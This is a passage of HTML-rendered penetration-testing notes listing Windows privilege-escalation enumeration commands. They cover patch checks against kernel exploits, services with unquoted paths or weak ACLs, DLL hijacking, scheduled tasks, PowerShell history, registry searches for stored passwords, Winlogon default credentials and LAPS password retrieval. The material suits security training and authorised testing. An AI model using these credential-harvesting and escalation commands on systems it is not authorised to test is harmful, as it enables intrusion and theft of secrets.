</span><span id="__span-43-29"><a id="__codelineno-43-29" name="__codelineno-43-29" href="#__codelineno-43-29"></a><span class="c"># ENUMERATION for kernel exploits (RISKY!)</span>
</span><span id="__span-43-30"><a id="__codelineno-43-30" name="__codelineno-43-30" href="#__codelineno-43-30"></a><span class="n">systeminfo</span>
</span><span id="__span-43-31"><a id="__codelineno-43-31" name="__codelineno-43-31" href="#__codelineno-43-31"></a><span class="nb">Get-CimInstance</span> <span class="n">-Class</span> <span class="n">win32_quickfixengineering</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Description</span> <span class="o">-eq</span> <span class="s2">&quot;Security Update&quot;</span> <span class="p">}</span>
</span><span id="__span-43-32"><a id="__codelineno-43-32" name="__codelineno-43-32" href="#__codelineno-43-32"></a><span class="c"># [For Patch finding](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360) If CVE isn&#39;t patched then we can exploit</span>
</span><span id="__span-43-33"><a id="__codelineno-43-33" name="__codelineno-43-33" href="#__codelineno-43-33"></a><span class="n">ver</span>
</span><span id="__span-43-34"><a id="__codelineno-43-34" name="__codelineno-43-34" href="#__codelineno-43-34"></a><span class="n">wmic</span> <span class="n">qfe</span> <span class="n">get</span> <span class="n">Caption</span><span class="p">,</span><span class="n">Description</span><span class="p">,</span><span class="n">HotFixID</span><span class="p">,</span><span class="n">InstalledOn</span>
</span><span id="__span-43-35"><a id="__codelineno-43-35" name="__codelineno-43-35" href="#__codelineno-43-35"></a>
</span><span id="__span-43-36"><a id="__codelineno-43-36" name="__codelineno-43-36" href="#__codelineno-43-36"></a><span class="c"># AV service</span>
</span><span id="__span-43-37"><a id="__codelineno-43-37" name="__codelineno-43-37" href="#__codelineno-43-37"></a><span class="nb">sc </span><span class="n">query</span> <span class="n">windefend</span>
</span><span id="__span-43-38"><a id="__codelineno-43-38" name="__codelineno-43-38" href="#__codelineno-43-38"></a>
</span><span id="__span-43-39"><a id="__codelineno-43-39" name="__codelineno-43-39" href="#__codelineno-43-39"></a>
</span><span id="__span-43-40"><a id="__codelineno-43-40" name="__codelineno-43-40" href="#__codelineno-43-40"></a><span class="c"># On kali machine, to find any kernel exploit</span>
</span><span id="__span-43-41"><a id="__codelineno-43-41" name="__codelineno-43-41" href="#__codelineno-43-41"></a><span class="n">wes</span> <span class="n">systeminfo</span><span class="p">.</span><span class="n">txt</span> <span class="n">-o</span> <span class="n">vulns</span><span class="p">.</span><span class="n">csv</span>
</span><span id="__span-43-42"><a id="__codelineno-43-42" name="__codelineno-43-42" href="#__codelineno-43-42"></a><span class="n">wes</span> <span class="n">systeminfo</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-exploits-only</span> <span class="p">-</span><span class="n">-hide</span> <span class="s2">&quot;Internet Explorer&quot;</span> <span class="n">Edge</span> <span class="n">Flash</span>
</span><span id="__span-43-43"><a id="__codelineno-43-43" name="__codelineno-43-43" href="#__codelineno-43-43"></a><span class="n">wes</span><span class="p">.</span><span class="n">py</span> <span class="n">-m</span> <span class="n">missing</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div>
<h4 id="networking">Networking</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="n">ipconfig</span> <span class="p">/</span><span class="n">all</span> <span class="c"># imp: for pivoting</span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="n">route</span> <span class="n">print</span>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="n">netstat</span> <span class="n">-ano</span>
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a><span class="nb">Get-NetTCPConnection</span>
</span></code></pre></div>
<h4 id="installed-apps">Installed apps</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="c"># enumerating installed apps</span>
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="nb">Get-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="nb">Get-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a><span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_Product</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Version</span>
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="nb">Get-Package</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="n">Name</span>
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a><span class="n">wmic</span> <span class="n">product</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">version</span>
</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="nb">Get-AppxPackage</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Version</span>
</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="c"># look for c:\ProgramFiles and Downloads folder</span>
</span></code></pre></div>
<h4 id="powershell-files">Powershell Files</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="c"># Powershell sensitive info</span>
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="nb">Get-History</span>
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="p">(</span><span class="nb">Get-PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span>  
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="c"># starting v5, v5.1, and v7 of powershell includes psreadline feature and clear-history doesn&#39;t clean that history</span>
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="c"># C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span>
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a><span class="c"># check for powershell transcripts file too</span>
</span><span id="__span-46-7"><a id="__codelineno-46-7" name="__codelineno-46-7" href="#__codelineno-46-7"></a><span class="c"># Event Viewer:  Microsoft\Windows\Powershell\Operational -&gt; Event ID 4103, 4104</span>
</span><span id="__span-46-8"><a id="__codelineno-46-8" name="__codelineno-46-8" href="#__codelineno-46-8"></a>
</span><span id="__span-46-9"><a id="__codelineno-46-9" name="__codelineno-46-9" href="#__codelineno-46-9"></a><span class="c"># to check any suspicious one</span>
</span><span id="__span-46-10"><a id="__codelineno-46-10" name="__codelineno-46-10" href="#__codelineno-46-10"></a><span class="nb">Get-EventLog</span> <span class="n">-LogName</span> <span class="s1">&#39;Windows Powershell&#39;</span>  <span class="p">|</span> <span class="nb">select-object</span> <span class="p">*</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">HostApplication</span> <span class="p">|</span> <span class="nb">sort-object</span> <span class="n">-Unique</span>
</span><span id="__span-46-11"><a id="__codelineno-46-11" name="__codelineno-46-11" href="#__codelineno-46-11"></a>
</span><span id="__span-46-12"><a id="__codelineno-46-12" name="__codelineno-46-12" href="#__codelineno-46-12"></a><span class="nb">Get-EventLog</span> <span class="n">-LogName</span> <span class="s1">&#39;Windows Powershell&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Message</span> <span class="o">-like</span> <span class="s1">&#39;*Registry*&#39;</span><span class="p">}</span> <span class="p">|</span> <span class="nb">select-object</span> <span class="p">*</span>
</span></code></pre></div>
<h4 id="running-processes">Running Processes</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="c"># Running processes to know which apps are running</span>
</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="nb">Get-Process</span>
</span><span id="__span-47-3"><a id="__codelineno-47-3" name="__codelineno-47-3" href="#__codelineno-47-3"></a><span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-Property</span> <span class="n">Name</span><span class="p">,</span> <span class="n">Path</span>
</span><span id="__span-47-4"><a id="__codelineno-47-4" name="__codelineno-47-4" href="#__codelineno-47-4"></a><span class="n">tasklist</span>
</span><span id="__span-47-5"><a id="__codelineno-47-5" name="__codelineno-47-5" href="#__codelineno-47-5"></a><span class="c"># to get the integrity level of any process we can use [NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.1.33)</span>
</span><span id="__span-47-6"><a id="__codelineno-47-6" name="__codelineno-47-6" href="#__codelineno-47-6"></a><span class="nb">Import-Module</span> <span class="n">NtObjectManager</span>
</span><span id="__span-47-7"><a id="__codelineno-47-7" name="__codelineno-47-7" href="#__codelineno-47-7"></a><span class="nb">Get-NtTokenIntegrityLevel</span>  <span class="c"># for current process</span>
</span><span id="__span-47-8"><a id="__codelineno-47-8" name="__codelineno-47-8" href="#__codelineno-47-8"></a>
</span><span id="__span-47-9"><a id="__codelineno-47-9" name="__codelineno-47-9" href="#__codelineno-47-9"></a><span class="n">tasklist</span> <span class="p">/</span><span class="n">FI</span> <span class="s2">&quot;PID eq 3420&quot;</span>
</span><span id="__span-47-10"><a id="__codelineno-47-10" name="__codelineno-47-10" href="#__codelineno-47-10"></a><span class="n">tasklist</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&quot;sync&quot;</span>
</span><span id="__span-47-11"><a id="__codelineno-47-11" name="__codelineno-47-11" href="#__codelineno-47-11"></a><span class="nb">Get-Process</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">ProcessName</span> <span class="o">-like</span> <span class="s2">&quot;*sql*&quot;</span> <span class="p">}</span>
</span><span id="__span-47-12"><a id="__codelineno-47-12" name="__codelineno-47-12" href="#__codelineno-47-12"></a>
</span><span id="__span-47-13"><a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a><span class="c"># User&#39;s integrity level</span>
</span><span id="__span-47-14"><a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
</span><span id="__span-47-15"><a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a><span class="c"># process integrity level using </span>
</span><span id="__span-47-16"><a id="__codelineno-47-16" name="__codelineno-47-16" href="#__codelineno-47-16"></a><span class="k">process</span> <span class="n">explorer</span>
</span><span id="__span-47-17"><a id="__codelineno-47-17" name="__codelineno-47-17" href="#__codelineno-47-17"></a><span class="c"># file integrity level and DACL test using</span>
</span><span id="__span-47-18"><a id="__codelineno-47-18" name="__codelineno-47-18" href="#__codelineno-47-18"></a><span class="n">icacls</span>
</span><span id="__span-47-19"><a id="__codelineno-47-19" name="__codelineno-47-19" href="#__codelineno-47-19"></a><span class="nb">get-acl</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-expandproperty</span> <span class="n">Access</span>
</span></code></pre></div>
<h4 id="windows-services">Windows Services</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c"># WINDOWS SERVICES</span>
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="c"># Non-admin users get &quot;permission denied&quot; errors with `Get-CimInstance` or `Get-Service` over network logons (e.g., WinRM); use interactive logon like RDP to bypass this.</span>
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">StartMode</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Name</span> <span class="o">-like</span> <span class="s1">&#39;servicename&#39;</span><span class="p">}</span>
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">select </span><span class="n">Name</span><span class="p">,</span><span class="n">PathName</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">StartMode</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-notlike</span> <span class="s2">&quot;C:\Windows\*&quot;</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-contains</span> <span class="s2">&quot;running&quot;</span><span class="p">}</span>
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a><span class="c"># for unquoted service path</span>
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">PathName</span><span class="p">|</span>  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-notlike</span> <span class="s1">&#39;*&quot;*&quot;*&#39;</span> <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-match</span> <span class="s2">&quot; &quot;</span>  <span class="o">-and</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-notlike</span> <span class="s1">&#39;C:\WINDOWS*&#39;</span><span class="p">}</span>
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a><span class="n">wmic</span> <span class="n">service</span> <span class="n">get</span> <span class="n">name</span><span class="p">,</span><span class="n">pathname</span> <span class="p">|</span>  <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;C:\Windows\\&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="p">/</span><span class="n">v</span> <span class="s2">&quot;&quot;&quot;</span>
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a>
</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="s2">Get-CimInstance -ClassName Win32_Service | ? {$_.Name -like &quot;</span><span class="p">*</span><span class="n">servicename</span><span class="p">*</span><span class="s2">&quot; } | select-object *</span>
</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="s2"># to check for the start mode if it&#39;s auto then we can reboot the machine to restart the service</span>
</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a><span class="s2">shutdown /r /t 0 # to reboot</span>
</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a><span class="s2">start-service servicename</span>
</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a><span class="s2">Stop-Service servicename</span>
</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a><span class="s2">net start/stop</span>
</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a>
</span><span id="__span-48-18"><a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a><span class="s2">wmic service list brief</span>
</span><span id="__span-48-19"><a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a><span class="s2">sc query &quot;</span><span class="n">servicename</span><span class="s2">&quot;</span>
</span><span id="__span-48-20"><a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a><span class="s2">sc qc &quot;</span><span class="n">servicename</span><span class="s2">&quot;  # to check if the  SERVICE_START_NAME : LocalSystem then escalate it to get NT Authority\System</span>
</span><span id="__span-48-21"><a id="__codelineno-48-21" name="__codelineno-48-21" href="#__codelineno-48-21"></a><span class="s2">sc sdshow &quot;</span><span class="n">servicename</span><span class="s2">&quot; # perms of user on service (A;;permissions;;;SID) [[Privilege Escalation#Service permissions]]</span>
</span><span id="__span-48-22"><a id="__codelineno-48-22" name="__codelineno-48-22" href="#__codelineno-48-22"></a><span class="s2">accesschk.exe /accepteula -uwqvc srvicename # but it can&#39;t properly work</span>
</span><span id="__span-48-23"><a id="__codelineno-48-23" name="__codelineno-48-23" href="#__codelineno-48-23"></a><span class="s2"># we can also use this [ps1 script](https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1) </span>
</span><span id="__span-48-24"><a id="__codelineno-48-24" name="__codelineno-48-24" href="#__codelineno-48-24"></a><span class="s2"># to [get service acls.](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)</span>
</span><span id="__span-48-25"><a id="__codelineno-48-25" name="__codelineno-48-25" href="#__codelineno-48-25"></a><span class="s2">Get-Service</span>
</span><span id="__span-48-26"><a id="__codelineno-48-26" name="__codelineno-48-26" href="#__codelineno-48-26"></a>
</span><span id="__span-48-27"><a id="__codelineno-48-27" name="__codelineno-48-27" href="#__codelineno-48-27"></a><span class="s2"># to check the permissions on all services</span>
</span><span id="__span-48-28"><a id="__codelineno-48-28" name="__codelineno-48-28" href="#__codelineno-48-28"></a><span class="s2">accesschk.exe -cuwqv &quot;</span><span class="n">molly</span><span class="p">.</span><span class="n">smith</span><span class="s2">&quot; * /accepteula</span>
</span><span id="__span-48-29"><a id="__codelineno-48-29" name="__codelineno-48-29" href="#__codelineno-48-29"></a>
</span><span id="__span-48-30"><a id="__codelineno-48-30" name="__codelineno-48-30" href="#__codelineno-48-30"></a>
</span><span id="__span-48-31"><a id="__codelineno-48-31" name="__codelineno-48-31" href="#__codelineno-48-31"></a><span class="s2"># For dll hijacking quick go through</span>
</span><span id="__span-48-32"><a id="__codelineno-48-32" name="__codelineno-48-32" href="#__codelineno-48-32"></a><span class="s2">objdump -x EnterpriseService.exe | grep -i dll</span>
</span><span id="__span-48-33"><a id="__codelineno-48-33" name="__codelineno-48-33" href="#__codelineno-48-33"></a><span class="s2">strings binary.exe | grep -iE &#39;.dll&#39;</span>
</span><span id="__span-48-34"><a id="__codelineno-48-34" name="__codelineno-48-34" href="#__codelineno-48-34"></a><span class="s2">ltrace binary # for binary hijacking</span>
</span><span id="__span-48-35"><a id="__codelineno-48-35" name="__codelineno-48-35" href="#__codelineno-48-35"></a>
</span><span id="__span-48-36"><a id="__codelineno-48-36" name="__codelineno-48-36" href="#__codelineno-48-36"></a><span class="s2"># check [[#PrivEsc Thru SERVICE]]</span>
</span></code></pre></div>
<h4 id="scheduled-tasks">Scheduled Tasks</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c"># SCHEDULED TASKS</span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">Author</span> <span class="o">-notlike</span> <span class="s2">&quot;*Microsoft*&quot;</span> <span class="o">-and</span> <span class="p">!</span><span class="no">[string]</span><span class="p">::</span><span class="n">IsNullOrWhiteSpace</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Author</span><span class="p">)}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">TaskName</span><span class="p">,</span> <span class="n">Author</span>
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="c"># more indepth details about task</span>
</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">tn</span> <span class="n">task_uri</span> <span class="p">/</span><span class="n">fo</span> <span class="n">list</span> <span class="p">/</span><span class="n">v</span>  <span class="c"># it shows task to run</span>
</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="c"># filtering for schtasks paths</span>
</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="n">schtasks</span> <span class="p">/</span><span class="n">query</span> <span class="p">/</span><span class="n">v</span> <span class="p">/</span><span class="n">fo</span> <span class="n">LIST</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="s2">&quot;TaskName:|Run As User:|Task To Run:&quot;</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="n">-Stream</span> <span class="p">|</span> <span class="p">%</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Trim</span><span class="p">()</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span> <span class="o">-match</span> <span class="s2">&quot;Task To Run:&quot;</span> <span class="o">-and</span> <span class="p">(</span><span class="nv">$_</span> <span class="o">-match</span> <span class="s2">&quot;Program Files&quot;</span> <span class="o">-or</span> <span class="nv">$_</span> <span class="o">-match</span> <span class="s2">&quot;C:\\&quot;</span><span class="p">)</span> <span class="p">}</span>
</span></code></pre></div>
<h4 id="more">More</h4>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c"># Registry Enumeration</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKLM</span> <span class="p">/</span><span class="n">f</span> <span class="n">password</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="p">/</span><span class="n">s</span>  <span class="c"># /f find &#39;password&#39; string in valuename and data  /s recursively</span>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\Path\To\Key&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">ValueName</span>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="n">reg</span> <span class="n">query</span> <span class="n">HKEY_CURRENT_USER</span><span class="p">\</span><span class="n">Software</span><span class="p">\</span><span class="n">SimonTatham</span><span class="p">\</span><span class="n">PuTTY</span><span class="p">\</span><span class="n">Sessions</span>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a><span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultUserName</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span><span class="p">).</span><span class="n">DefaultUserName</span>                
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&quot;HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</span> <span class="n">-Name</span> <span class="n">DefaultPassword</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span><span class="p">).</span><span class="n">DefaultPassword</span>                                                                                                                         
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&quot;</span>
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c"># Drives</span>
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a><span class="n">wmic</span> <span class="n">logicaldisk</span>
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>
</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="c"># Event logs</span>
</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a><span class="nb">Get-EventLog</span> <span class="n">-LogName</span> <span class="n">System</span> <span class="n">-Newest</span> <span class="n">10</span>
</span><span id="__span-50-15"><a id="__codelineno-50-15" name="__codelineno-50-15" href="#__codelineno-50-15"></a>
</span><span id="__span-50-16"><a id="__codelineno-50-16" name="__codelineno-50-16" href="#__codelineno-50-16"></a><span class="c"># Firewall</span>
</span><span id="__span-50-17"><a id="__codelineno-50-17" name="__codelineno-50-17" href="#__codelineno-50-17"></a><span class="n">netsh</span> <span class="n">firewall</span> <span class="n">show</span> <span class="n">state</span>
</span><span id="__span-50-18"><a id="__codelineno-50-18" name="__codelineno-50-18" href="#__codelineno-50-18"></a>
</span><span id="__span-50-19"><a id="__codelineno-50-19" name="__codelineno-50-19" href="#__codelineno-50-19"></a><span class="c"># More about [LAPS](https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/laps)</span>
</span><span id="__span-50-20"><a id="__codelineno-50-20" name="__codelineno-50-20" href="#__codelineno-50-20"></a><span class="c"># LAPS Enumeration using [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)</span>
</span><span id="__span-50-21"><a id="__codelineno-50-21" name="__codelineno-50-21" href="#__codelineno-50-21"></a><span class="c"># Get groups that can read passwords</span>
</span><span id="__span-50-22"><a id="__codelineno-50-22" name="__codelineno-50-22" href="#__codelineno-50-22"></a><span class="nb">Find-LAPSDelegatedGroups</span>
</span><span id="__span-50-23"><a id="__codelineno-50-23" name="__codelineno-50-23" href="#__codelineno-50-23"></a>
</span><span id="__span-50-24"><a id="__codelineno-50-24" name="__codelineno-50-24" href="#__codelineno-50-24"></a><span class="c"># Checks the rights on each computer with LAPS enabled for any groups</span>
</span><span id="__span-50-25"><a id="__codelineno-50-25" name="__codelineno-50-25" href="#__codelineno-50-25"></a><span class="c"># with read access and users with &quot;All Extended Rights&quot;</span>
</span><span id="__span-50-26"><a id="__codelineno-50-26" name="__codelineno-50-26" href="#__codelineno-50-26"></a><span class="nb">Find-AdmPwdExtendedRights</span>
</span><span id="__span-50-27"><a id="__codelineno-50-27" name="__codelineno-50-27" href="#__codelineno-50-27"></a>
</span><span id="__span-50-28"><a id="__codelineno-50-28" name="__codelineno-50-28" href="#__codelineno-50-28"></a><span class="c"># Get computers with LAPS enabled, expirations time and the password (if you have access)</span>
</span><span id="__span-50-29"><a id="__codelineno-50-29" name="__codelineno-50-29" href="#__codelineno-50-29"></a><span class="nb">Get-LAPSComputers</span>
</span></code></pre></div>
<h4 id="searching-commands_1">Searching Commands</h4>
